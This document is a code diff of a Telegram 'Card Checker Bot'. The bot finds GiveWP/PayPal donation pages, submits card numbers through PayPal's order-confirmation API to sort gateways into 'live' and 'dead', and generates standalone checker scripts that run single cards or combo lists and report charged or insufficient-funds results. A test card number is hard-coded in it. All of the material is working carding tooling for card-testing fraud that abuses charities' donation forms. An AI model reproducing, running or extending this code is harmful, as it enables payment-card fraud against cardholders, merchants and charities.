+                'authorization': f'Bearer {auth_token}',
+                'paypal-client-metadata-id': self.client_id or '',
+                'user-agent': random_ua(),
+                'content-type': 'application/json',
+            }
+            body = {
+                'payment_source': {
+                    'card': {
+                        'number': n,
+                        'expiry': expiry,
+                        'security_code': cvc,
+                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
+                    }
+                },
+                'application_context': {'vault': False}
+            }
+            for url in [
+                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+                f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+            ]:
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=self.TIMEOUT)
-                    confirm_text = confirm_res.text
-                    if confirm_res.status_code == 200:
+                    r = self.session.post(url, headers=headers, json=body, timeout=CONFIG['timeout'])
+                    if r.text:
+                        confirm_text = r.text
                         try:
-                            confirm_json = confirm_res.json()
+                            confirm_json = r.json()
                         except:
-                            confirm_json = {}
-                        break
+                            pass
+                        if r.status_code in [200, 201, 400, 422]:
+                            return confirm_json, confirm_text
                 except:
                     continue
+        return confirm_json, confirm_text
 
-            if isinstance(confirm_json, dict):
-                if 'details' in confirm_json and len(confirm_json['details']) > 0:
-                    detail = confirm_json['details'][0]
-                    issue = detail.get('issue', '')
-                    description = detail.get('description', '')
-                    if issue:
-                        if issue == 'ORDER_NOT_APPROVED':
-                            return "Payer cannot pay for this transaction."
-                        if description:
-                            return f"{issue}: {description}"
-                        return issue
-                if 'name' in confirm_json:
-                    name = confirm_json.get('name', '')
-                    if name in self.paypal_responses:
-                        msg = confirm_json.get('message', '')
-                        if msg:
-                            return f"{name}: {msg}"
-                        return name
-                if 'message' in confirm_json:
-                    return confirm_json.get('message', '')
+    def approve_order(self, order_id):
+        if not self.ajax_url:
+            return None
+        priority = [a for a in self.actions if 'approve' in a.lower()] + [
+            'give_paypal_commerce_approve_order',
+            'give_paypal_donations_approve_order',
+            'give_paypal_standard_approve_order',
+            'give_paypal_express_approve_order',
+            'give_paypal_approve_order',
+            'ppcp_approve_order',
+            'approve_order',
+        ]
+        headers = {
+            'user-agent': random_ua(),
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'{self.scheme}://{self.domain}',
+            'referer': f'{self.scheme}://{self.domain}{self.path}',
+        }
+        for amount in CONFIG['amounts']:
+            for action in priority[:5]:
+                for nonce in (self.nonces[:2] or ['']):
+                    form_data = self.build_form_data(amount, nonce)
+                    form_data['order'] = order_id
+                    form_data['order_id'] = order_id
+                    try:
+                        r = self.session.post(
+                            self.ajax_url,
+                            params={'action': action, 'order': order_id},
+                            data=form_data,
+                            headers=headers,
+                            timeout=CONFIG['timeout']
+                        )
+                        if r.status_code == 200 and r.text and len(r.text.strip()) > 3:
+                            return r
+                    except:
+                        continue
+        return None
 
-            if confirm_text:
-                try:
-                    text_json = json.loads(confirm_text)
-                    if isinstance(text_json, dict):
-                        if 'details' in text_json and len(text_json['details']) > 0:
-                            detail = text_json['details'][0]
-                            issue = detail.get('issue', '')
-                            description = detail.get('description', '')
-                            if issue:
-                                if issue == 'ORDER_NOT_APPROVED':
-                                    return "Payer cannot pay for this transaction."
-                                if description:
-                                    return f"{issue}: {description}"
-                                return issue
-                        if 'name' in text_json:
-                            name = text_json.get('name', '')
-                            if name in self.paypal_responses:
-                                msg = text_json.get('message', '')
-                                if msg:
-                                    return f"{name}: {msg}"
-                                return name
-                except:
-                    pass
-                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
-                if issue_matches:
-                    issue = issue_matches[0]
-                    if issue == 'ORDER_NOT_APPROVED':
-                        return "Payer cannot pay for this transaction."
-                    desc_matches = re.findall(r'"description"\s*:\s*"([^"]+)"', confirm_text)
-                    if desc_matches:
-                        return f"{issue}: {desc_matches[0]}"
-                    return issue
-                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
-                if name_matches:
-                    name = name_matches[0]
-                    if name in self.paypal_responses:
-                        msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
-                        if msg_matches:
-                            return f"{name}: {msg_matches[0]}"
-                        return name
-
-            approve_res = self._approve_order(order_id)
-            text = approve_res.text if approve_res else ''
-
-            if text:
-                return self._clean_response(text)
-
-            return "DECLINED"
-        except Exception as e:
-            return f"Error: {e}"
-
-@bot.message_handler(commands=["start"])
-def start(message):
-    with open("blockusers.txt", "r") as file:
-        blocked = file.read().splitlines()
-    if str(message.from_user.id) in blocked:
-        safe_send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
-        return 
-    
-    user_id = message.from_user.id
-    userr = message.from_user.first_name
-    username = message.from_user.username or "No Username"
-
-    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
-[⚡] 𝐍𝐚𝐦𝐞: {userr}
-[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
-[⚡] 𝐈𝐃: <code>{user_id}</code>
-- - - - - - - - - - - - - - - - - - - - - -
-[⚡] PayPal Gateway >> /paypal 
-[⚡] Mass Extract >> /mass
-[⚡] Send Feedback >> Button Below
-- - - - - - - - - - - - - - - - - - - - - -
-[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
-[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
-    
-    FRA = types.InlineKeyboardMarkup(row_width=2)
-    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
-    FRA.add(Yes22)
-    
-    safe_send_message(message.chat.id, IU, reply_markup=FRA)
-
-@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
-def feedback(call):
-    user_id = call.from_user.id
-    userr = call.from_user.first_name
-    Atty = types.InlineKeyboardMarkup(row_width=1)
-    back = types.InlineKeyboardButton("Back", callback_data="start")
-    Atty.add(back)
-    YTT = f'''Welcome {userr} Send your message and the admin will respond.'''
-    try:
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
-    except Exception as e:
-        print(f"Feedback error: {e}")
-    waiting_users[user_id] = True
-
-@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
-def get_user_msg(message):
-    user_id = message.from_user.id
-    name = message.from_user.first_name
-    kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
-    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
-    kb2 = types.InlineKeyboardMarkup()
-    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
-    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
-    waiting_users.pop(user_id)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
-def start_reply(call):
-    user_id = int(call.data.split("_")[1])
-    reply_mode[call.from_user.id] = user_id
-    safe_send_message(call.from_user.id, "Write your reply now:")
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
-def send_reply(message):
-    user_id = reply_mode[message.from_user.id]
-    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
-    safe_send_message(OWNER_ID, "Reply sent.")
-    reply_mode.pop(message.from_user.id)
-
-@bot.callback_query_handler(func=lambda call: call.data == "start")
-def back_to_start(call):
-    user_id = call.from_user.id
-    userr = call.from_user.first_name
-    username = call.from_user.username or "No Username"
-    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'''
-    FRA = types.InlineKeyboardMarkup(row_width=2)
-    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
-    FRA.add(Yes22)
-    try:
-        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
-    except Exception as e:
-        print(f"Back error: {e}")
-
-@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
-def ali_al2(massege):
-    with open("blockusers.txt", "r") as file:
-        blocked = file.read().splitlines()
-    if str(massege.from_user.id) in blocked:
-        safe_send_message(massege.chat.id, 'The admin has blocked you.')
-        return
-
-    ko = safe_send_message(massege.chat.id, "- The gate is being withdrawn ...")
-    if not ko:
-        return
-    
-    try:
-        parts = massege.text.split(maxsplit=1)
-        if len(parts) != 2:
-            safe_edit_message(massege.chat.id, ko.message_id, '''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''')
-            return
-
-        link = parts[1].strip()
-
-        if not link.startswith(("http://", "https://")):
-            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
-            return
-
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
-        if r.status_code != 200:
-            safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
-            return
-
-        safe_edit_message(massege.chat.id, ko.message_id, "Gate found ✅")
-
-    except:
-        pass
-
-    try:
-        paypal = PayPalCommerce(target_url=link)
-        result = paypal.Charge('5143772354638703|05|28|886')
-        
-        is_live = False
-        for pr in PAYPAL_RESPONSES:
-            if pr.lower() in result.lower():
-                is_live = True
-                break
-        
-        for dr in DEAD_RESPONSES:
-            if dr.lower() in result.lower():
-                safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
-                paypal.r.close()
-                return
-        
-        if not is_live:
-            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
-            paypal.r.close()
-            return
-
-        file_name = f'gateway_{int(time.time())}.py'
-        with open(file_name, "w", encoding="utf-8") as f:
-            f.write(generate_gateway_code(result, link, paypal))
-        
-        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30''')
-        os.remove(file_name)
-        paypal.r.close()
-
-    except Exception as e:
-        print(f"Error in ali_al2: {e}")
-        if 'paypal' in locals():
+    def analyze_response(self, cj, ct, at):
+        if isinstance(cj, dict):
+            if 'details' in cj and cj['details']:
+                d = cj['details'][0]
+                issue = d.get('issue', '')
+                desc = d.get('description', '')
+                if issue:
+                    return f"{issue}: {desc}" if desc else issue
+            if 'name' in cj and cj['name']:
+                msg = cj.get('message', '')
+                return f"{cj['name']}: {msg}" if msg else cj['name']
+            if 'message' in cj and cj['message']:
+                return cj['message']
+        if ct:
+            issues = re.findall(r'"issue"\s*:\s*"([^"]+)"', ct)
+            if issues:
+                descs = re.findall(r'"description"\s*:\s*"([^"]+)"', ct)
+                return f"{issues[0]}: {descs[0]}" if descs else issues[0]
+            names = re.findall(r'"name"\s*:\s*"([^"]+)"', ct)
+            if names:
+                return names[0]
+        if at:
+            t = at.strip()
+            if t.lower() == 'true':
+                return "CHARGE"
             try:
-                paypal.r.close()
+                j = json.loads(t)
+                if isinstance(j, dict):
+                    if j.get('success') is True:
+                        return "CHARGE"
+                    if 'data' in j:
+                        d = j['data']
+                        if isinstance(d, dict):
+                            for k in ['error', 'message', 'msg', 'reason', 'status']:
+                                if k in d:
+                                    return str(d[k])
+                        elif isinstance(d, str) and d:
+                            return d
             except:
                 pass
+            return t[:200]
+        return "DECLINED"
 
-@bot.message_handler(commands=['mass'])
-def mass_extract_start(message):
-    with open("blockusers.txt", "r") as file:
-        blocked = file.read().splitlines()
-    if str(message.from_user.id) in blocked:
-        safe_send_message(message.chat.id, 'The admin has blocked you.')
-        return
+    def check(self, card):
+        if not self.is_valid:
+            return "INVALID_GATEWAY", None
+        if self.client_id:
+            self.get_access_token()
+        oid, used_amount = self.create_order()
+        if not oid and not self.client_token:
+            self.get_client_token()
+            if self.client_token:
+                oid, used_amount = self.create_order()
+        if not oid:
+            if self._last_response:
+                return f"SERVER: {self._last_response[:250]}", None
+            return "No response from server", None
+        cj, ct = {}, ""
+        if any([self.client_token, self.access_token, self.client_id]):
+            cj, ct = self.confirm_payment_source(oid, card)
+        ap = self.approve_order(oid)
+        at = ap.text if ap else ""
+        result = self.analyze_response(cj, ct, at)
+        return result, used_amount
 
-    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
-    if msg:
-        bot.register_next_step_handler(msg, process_mass_file)
 
-@bot.message_handler(commands=['stop'])
-def stop_mass(message):
-    user_id = message.from_user.id
-    if user_id in processing_status:
-        processing_status[user_id]['stop_flag'] = True
-        safe_send_message(message.chat.id, "🛑 Stopping...")
-    else:
-        safe_send_message(message.chat.id, "❌ No active process.")
-
+# ============================================================
+# فحص رابط واحد
+# ============================================================
 def check_single_link(link):
-    paypal = None
+    checker = None
     try:
         if not link.startswith(("http://", "https://")):
-            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
-        
-        paypal = PayPalCommerce(target_url=link)
-        result = paypal.Charge('5143772354638703|05|28|886')
-        
-        is_live = False
-        for pr in PAYPAL_RESPONSES:
-            if pr.lower() in result.lower():
-                is_live = True
-                break
-        
-        for dr in DEAD_RESPONSES:
-            if dr.lower() in result.lower():
-                return {'link': link, 'live': False, 'respons': result}
-        
+            return {'link': link, 'live': False, 'respons': 'Invalid URL',
+                    'amount': None, 'gateway': None}
+
+        checker = PayPalChecker(link)
+        if not checker.init():
+            return {'link': link, 'live': False, 'respons': 'No PayPal/GiveWP detected',
+                    'amount': None, 'gateway': None}
+
+        card_tuple = (
+            CONFIG['card']['number'],
+            CONFIG['card']['month'],
+            CONFIG['card']['year'],
+            CONFIG['card']['cvv'],
+        )
+        result, used_amount = checker.check(card_tuple)
+
+        is_dead = any(d.lower() in result.lower() for d in DEAD_RESPONSES)
+        result_upper = result.upper()
+        is_live = any(r.upper() in result_upper for r in ALL_GATEWAY_RESPONSES)
+
+        base = {
+            'link': link,
+            'respons': result,
+            'amount': used_amount,
+            'gateway': checker.gateway_type,
+        }
+
+        if is_dead:
+            base['live'] = False
+            return base
+
         if is_live:
-            return {
-                'link': link,
-                'live': True,
-                'respons': result,
-                'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
-                'id_form2': paypal.form_data.get('give-form-id', ''),
-                'nonec': paypal.form_data.get('give-form-hash', ''),
-                'au': paypal.client_token or paypal.access_token or '',
-            }
-        
-        return {'link': link, 'live': False, 'respons': result}
-        
+            base['live'] = True
+            base['id_form1'] = checker.form_id_prefix or ''
+            base['id_form2'] = checker.form_id or ''
+            base['nonec'] = checker.form_hash or ''
+            base['au'] = checker.client_token or checker.access_token or ''
+            return base
+
+        base['live'] = False
+        return base
+
     except Exception as e:
-        return {'link': link, 'live': False, 'respons': str(e)[:100]}
+        return {'link': link, 'live': False, 'respons': str(e)[:100],
+                'amount': None, 'gateway': None}
     finally:
-        if paypal and hasattr(paypal, 'r'):
+        if checker:
             try:
-                paypal.r.close()
+                checker.session.close()
             except:
                 pass
 
-def generate_gateway_code(result, link, paypal_obj=None):
-    id_form1 = paypal_obj.form_data.get('give-form-id-prefix', '') if paypal_obj else ''
-    id_form2 = paypal_obj.form_data.get('give-form-id', '') if paypal_obj else ''
-    nonec = paypal_obj.form_data.get('give-form-hash', '') if paypal_obj else ''
-    au = paypal_obj.client_token or paypal_obj.access_token or '' if paypal_obj else ''
-    
+
+# ============================================================
+# توليد كود الـ Gateway
+# ============================================================
+def generate_gateway_code(result, link, paypal_data=None):
+    id_form1 = ''
+    id_form2 = ''
+    nonec = ''
+    au = ''
+    gateway_type = 'paypal-commerce'
+    donation_amount = '1.00'
+
+    if paypal_data:
+        id_form1 = paypal_data.get('id_form1', '')
+        id_form2 = paypal_data.get('id_form2', '')
+        nonec = paypal_data.get('nonec', '')
+        au = paypal_data.get('au', '')
+        gateway_type = paypal_data.get('gateway', 'paypal-commerce')
+        if paypal_data.get('amount'):
+            donation_amount = paypal_data['amount']
+
+    if gateway_type == 'paypal_donations':
+        create_action = 'give_paypal_donations_create_order'
+        approve_action = 'give_paypal_donations_approve_order'
+        payment_mode = 'paypal_donations'
+    elif gateway_type == 'paypal_standard':
+        create_action = 'give_paypal_standard_create_order'
+        approve_action = 'give_paypal_standard_approve_order'
+        payment_mode = 'paypal_standard'
+    elif gateway_type == 'paypal_express':
+        create_action = 'give_paypal_express_create_order'
+        approve_action = 'give_paypal_express_approve_order'
+        payment_mode = 'paypal_express'
+    else:
+        create_action = 'give_paypal_commerce_create_order'
+        approve_action = 'give_paypal_commerce_approve_order'
+        payment_mode = 'paypal-commerce'
+
     return f'''import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -1167,12 +1058,15 @@ class PayPal:
     def __init__(self):
         self.first_name = ["James", "John", "Robert", "Michael", "William"]
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
-        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
-        self.donation = "1.00"
+        self.paypal = "{au[:40] if au else 'b220b06032291ef03c4bd21a74cab3ad'}"
+        self.donation = "{donation_amount}"
         self.id_form1 = "{id_form1}"
         self.id_form2 = "{id_form2}"
         self.nonec = "{nonec}"
         self.au = "{au}"
+        self.create_action = "{create_action}"
+        self.approve_action = "{approve_action}"
+        self.payment_mode = "{payment_mode}"
         url = '{link}'
         parsed = urlparse(url)
         self.url = parsed.netloc
@@ -1188,78 +1082,100 @@ class PayPal:
     def Charge(self, ccx):
         self.checked += 1
         ccx = ccx.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3].strip()
+        parts = ccx.split("|")
+        if len(parts) < 4:
+            return "Invalid card format"
+        n = parts[0].strip()
+        mm = parts[1].strip()
+        yy = parts[2].strip()
+        cvc = parts[3].strip()
         if "20" in yy:
             yy = yy.split("20")[1]
-        
-        da2 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
-        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
-        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
 
-        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
-        da3 = {{
-            'payment_source': {{
-                'card': {{
-                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
-                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
+        try:
+            da2 = MultipartEncoder({{
+                'give-form-id-prefix': (None, self.id_form1),
+                'give-form-id': (None, self.id_form2),
+                'give-form-hash': (None, self.nonec),
+                'give-amount': (None, self.donation),
+                'payment-mode': (None, self.payment_mode),
+                'give_first': (None, random.choice(self.first_name)),
+                'give_last': (None, random.choice(self.last_name)),
+                'give_email': (None, self.email),
+                'give-gateway': (None, self.payment_mode),
+            }})
+            he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
+            pa1 = {{'action': self.create_action}}
+            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2, timeout=20).json()
+            order_id = None
+            if 'data' in r3:
+                if isinstance(r3['data'], dict) and 'id' in r3['data']:
+                    order_id = r3['data']['id']
+                elif isinstance(r3['data'], str):
+                    order_id = r3['data']
+            if not order_id:
+                return "Create Order Failed"
+        except Exception as e:
+            return f"Create Order Failed: {{str(e)[:60]}}"
+
+        try:
+            he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
+            da3 = {{
+                'payment_source': {{
+                    'card': {{
+                        'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
+                        'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
+                    }},
                 }},
-            }},
-            'application_context': {{'vault': False}},
-        }}
-        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
+                'application_context': {{'vault': False}},
+            }}
+            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source', headers=he4, json=da3, timeout=20)
+        except:
+            pass
 
-        da4 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
-        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
-        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
-        
-        text = r5.text
-        if 'true' in text: return 'CHARGE 1.00$'
-        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
-        else:
-            try: return r5.json()['data']['error']
-            except: return "UNKNOWN_ERROR"
+        try:
+            da4 = MultipartEncoder({{
+                'give-form-id-prefix': (None, self.id_form1),
+                'give-form-id': (None, self.id_form2),
+                'give-form-hash': (None, self.nonec),
+                'give-amount': (None, self.donation),
+                'payment-mode': (None, self.payment_mode),
+                'give_first': (None, random.choice(self.first_name)),
+                'give_last': (None, random.choice(self.last_name)),
+                'give_email': (None, self.email),
+                'give-gateway': (None, self.payment_mode),
+            }})
+            he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
+            pa2 = {{'action': self.approve_action, 'order': order_id}}
+            r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4, timeout=20)
+            text = r5.text
+            if 'true' in text:
+                return 'CHARGE ' + self.donation
+            elif 'INSUFFICIENT_FUNDS' in text:
+                return "INSUFFICIENT_FUNDS"
+            elif 'ORDER_NOT_APPROVED' in text:
+                return "Payer cannot pay for this transaction."
+            elif 'DECLINED' in text.upper():
+                return "DECLINED"
+            else:
+                try:
+                    return r5.json()['data']['error']
+                except:
+                    return text[:100] if text else "UNKNOWN_ERROR"
+        except Exception as e:
+            return f"Error: {{str(e)[:60]}}"
 
 if __name__ == '__main__':
-    Getat = 'PayPal Custom 1$'
+    Getat = 'PayPal Custom {donation_amount}'
     print(f'Cheker {{Getat}}')
     Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
     if Br == '1':
         while True:
             ar = input('Enter Card ( n | mm | yy | cvc ): ')
             rr = PayPal()
-            itt = rr.Key()
             resulti = rr.Charge(ar)
-            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                with open('Approved Card.txt', "a") as f:
-                    f.write(ar + f': {{resulti}} > {{Getat}}')
             print('Response: ' + resulti)
-            time.sleep(5)
+            time.sleep(3)
     else:
         noy = 0
         cr = input('Enter Name Combo: ')
@@ -1269,15 +1185,190 @@ if __name__ == '__main__':
                 noy += 1
                 try:
                     rr = PayPal()
-                    itt = rr.Key()
                     resulti = rr.Charge(P)
                 except Exception as e:
                     resulti = f'Error {{e}}'
-                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                    with open('Approved Card.txt', "a") as f:
-                        f.write(P + ': {{resulti}} > {{Getat}}')
                 print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
-                time.sleep(13)'''
+                time.sleep(8)'''
+
+
+# ============================================================
+# Telegram Handlers
+# ============================================================
+@bot.message_handler(commands=["start"])
+def start(message):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(message.from_user.id) in blocked:
+        safe_send_message(message.chat.id, 'The admin has blocked you.')
+        return
+
+    user_id = message.from_user.id
+    userr = message.from_user.first_name
+    username = message.from_user.username or "No Username"
+
+    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
+[⚡] 𝐍𝐚𝐦𝐞: {userr}
+[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
+[⚡] 𝐈𝐃: <code>{user_id}</code>
+- - - - - - - - - - - - - - - - - - - - - -
+[⚡] PayPal Gateway >> /paypal 
+[⚡] Mass Extract >> /mass
+[⚡] Send Feedback >> Button Below
+- - - - - - - - - - - - - - - - - - - - - -
+[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30'''
+
+    FRA = types.InlineKeyboardMarkup(row_width=2)
+    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
+    FRA.add(Yes22)
+
+    safe_send_message(message.chat.id, IU, reply_markup=FRA)
+
+
+@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
+def feedback(call):
+    user_id = call.from_user.id
+    userr = call.from_user.first_name
+    Atty = types.InlineKeyboardMarkup(row_width=1)
+    Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
+    YTT = f'Welcome {userr} Send your message and the admin will respond.'
+    try:
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
+                              text=YTT, parse_mode='HTML', reply_markup=Atty)
+    except:
+        pass
+    waiting_users[user_id] = True
+
+
+@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
+def get_user_msg(message):
+    user_id = message.from_user.id
+    name = message.from_user.first_name
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
+    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
+    kb2 = types.InlineKeyboardMarkup()
+    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
+    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
+    waiting_users.pop(user_id, None)
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
+def start_reply(call):
+    try:
+        user_id = int(call.data.split("_")[1])
+        reply_mode[call.from_user.id] = user_id
+        safe_send_message(call.from_user.id, "Write your reply now:")
+    except:
+        pass
+
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
+def send_reply(message):
+    user_id = reply_mode.pop(message.from_user.id, None)
+    if not user_id:
+        return
+    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
+    safe_send_message(OWNER_ID, "Reply sent.")
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "start")
+def back_to_start(call):
+    user_id = call.from_user.id
+    userr = call.from_user.first_name
+    username = call.from_user.username or "No Username"
+    IU = f'[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'
+    FRA = types.InlineKeyboardMarkup(row_width=2)
+    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
+    try:
+        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
+    except:
+        pass
+
+
+# ============================================================
+# /paypal — فحص رابط واحد
+# ============================================================
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
+def cmd_paypal(message):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(message.from_user.id) in blocked:
+        return
+
+    ko = safe_send_message(message.chat.id, "🔍 Scanning...")
+    if not ko:
+        return
+
+    try:
+        parts = message.text.split(maxsplit=1)
+        if len(parts) != 2:
+            safe_edit_message(message.chat.id, ko.message_id,
+                              "Please send:\n<code>/paypal https://example.com/donate</code>")
+            return
+
+        link = parts[1].strip()
+        if not link.startswith(("http://", "https://")):
+            safe_edit_message(message.chat.id, ko.message_id, "❌ Invalid link")
+            return
+
+        result = check_single_link(link)
+
+        if result.get('live'):
+            file_name = f'gateway_{int(time.time())}.py'
+            try:
+                with open(file_name, 'w', encoding='utf-8') as f:
+                    f.write(generate_gateway_code(result['respons'], result['link'], result))
+
+                price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"
+
+                safe_send_document(message.chat.id, file_name,
+                    caption=f'''✅ <b>Live Gateway Found!</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Link: <code>{link}</code>
